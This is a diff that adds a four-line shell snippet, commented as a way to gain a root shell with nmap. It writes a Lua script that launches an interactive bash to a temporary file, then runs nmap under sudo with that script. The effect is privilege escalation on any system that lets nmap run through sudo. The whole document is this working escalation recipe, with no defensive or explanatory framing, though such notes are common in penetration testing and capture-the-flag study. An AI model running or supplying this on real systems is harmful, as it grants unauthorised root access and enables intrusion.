@@ -1,0 +1,4 @@
+#used to gain root shell with nmap
+TF=$(mktemp)
+echo 'os.execute("/bin/bash -i")' > $TF
+sudo nmap --script=$TF
